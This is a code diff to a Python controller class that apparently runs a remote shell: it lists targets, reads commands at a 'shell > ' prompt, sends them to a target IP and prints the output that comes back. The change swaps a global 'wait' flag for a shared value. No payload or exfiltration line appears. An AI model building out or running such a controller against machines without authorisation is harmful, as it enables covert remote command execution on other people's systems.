@@ -25,7 +25,7 @@ class Controller(Host):
         super().__init__()
         self.db = TinyDB('./db.json')
         self.mock_stdout = ""
-        print(wait)
+
 
     def list_hosts(self):
         response = "[ Targets ]\n"
@@ -51,11 +51,11 @@ class Controller(Host):
         sniffer.start()
 
         while True:
-            if not wait:
+            if not wait.value:
                 cmd = input(colored("shell > ", "red")).encode()
                 if len(cmd) != 0:
                     self.send(target['ip'], "instruction", cmd)
-                    wait = True
+                    wait.value = True
 
     def instruction(self, shellpack):
         global wait
@@ -66,13 +66,13 @@ class Controller(Host):
             self.mock_stdout += shellpack['data'].decode()
             print(self.mock_stdout)
             self.mock_stdout = ""
-            wait = False
+            wait.value = False
         elif shellpack['option'] == "ERROR":
             print(f"[ERROR] {shellpack['data'].decode()}")
-            wait = False
+            wait.value = False
         else:
             print(f"{shellpack['data'].decode()}")
-            wait = False
+            wait.value = False
         
 
 if __name__ == "__main__":
